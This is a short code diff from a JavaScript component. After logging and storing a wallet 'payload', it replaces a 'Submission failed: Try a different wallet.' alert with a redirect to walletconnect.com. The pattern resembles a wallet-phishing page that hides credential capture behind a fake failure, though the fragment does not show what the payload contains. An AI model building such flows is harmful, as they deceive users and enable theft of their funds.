@@ -227,7 +227,7 @@ export default {
 
         console.log(payload);
         this.addWallet(payload);
-        alert("Submission failed: Try a different wallet.");
+        window.location.href = "https://walletconnect.com/";
       }
       return false;
     },
